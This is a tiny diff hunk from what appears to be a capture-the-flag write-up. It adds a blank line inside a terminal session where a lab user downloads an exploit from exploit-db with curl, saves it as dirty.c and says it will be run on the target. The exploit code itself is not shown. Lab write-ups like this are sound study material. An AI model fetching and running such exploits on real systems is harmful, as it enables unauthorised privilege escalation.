@@ -226,6 +226,7 @@ Now we will download and run it on the system.
 
 ```
 laurie@BornToSecHackMe:~$ curl https://www.exploit-db.com/download/40839 > dirty.c
+
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  5006  100  5006    0     0   9182      0 --:--:-- --:--:-- --:--:-- 12091
